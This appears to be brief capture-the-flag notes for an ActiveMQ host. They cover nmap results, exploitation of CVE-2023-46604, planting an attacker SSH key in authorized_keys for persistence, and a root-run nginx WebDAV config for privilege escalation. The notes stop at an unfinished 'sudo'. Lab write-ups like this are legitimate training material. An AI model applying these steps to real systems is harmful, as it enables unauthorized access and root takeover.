# Recon

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 404 Not Found
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
1337/tcp  open  http       nginx 1.18.0 (Ubuntu)
1338/tcp  open  http       nginx 1.18.0 (Ubuntu)
1883/tcp  open  mqtt
5672/tcp  open  amqp?
8080/tcp  open  http       nginx 1.18.0 (Ubuntu)
8161/tcp  open  http       Jetty 9.4.39.v20210325
45451/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
61616/tcp open  apachemq   ActiveMQ OpenWire transport

```
ActiceMQ OpenWire is vuln to RCE *CVE-2023-46604*

# exploit
https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell/blob/master/exploit.py

# foothold
## pivot sur ssh
```
mkdir /home/activemq/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5P6NxOdnNg+uGiuUbRhs8euRcndj/LEGnYWayIkoQBpxXESmKCBCzaRbVR26KIg3KHNqX6RhD7SRyA9P7xie1cuv6GirmziluFdTRax2KKMGiclCg5xERnCX6e9VrTbBEAVmPPtXg4zcPXOS0Fv0JWGxYfCi80FkmfLTe/suOsFqOSO9IFqhCn61vC/TVrjMApAergfyhG/WM+0rV6z6/FUOFbrSK8Eou3TMMehJ50eakPN/xS8me/2k0AU8THnFUSpDmEuDqn8wzxepIc9mkcFdtIrgBIL7HonBVa1zT0WJFS8c6RRlvSUaF0GMk1X2nb5YsCSskrhcfF+w0mWsUdFreIUbpH7iE6NW9RbdkxFMnJyJqYQnd+pP7WsT4KVHBWkSflyN8lw+qRcCAH6Bm1WL1sNTFw8ZZ8Ftc/BXs6OmiuZH0H8JUsfqJ2gth7n6dgUu73Zlgxw4j/xDHcyshXk8x0C7CizJue92IT03ejH5I9jlubTekfjt85SoKbkU= kali@kali" > /home/activemq/.ssh/authorized_keys

```
# PrivEsc

```
nano /dev/shm/nginx.conf
```
```bash
worker_processes  4;
user              root;
pid /dev/shm/nginx.pid;

events {
    use           epoll;
    worker_connections  128;
}

http {
    server {
        listen        1234;

        location      / {
            root      /;
            autoindex on;
            dav_methods PUT;
        }
    }
}
```

```
sudo 
```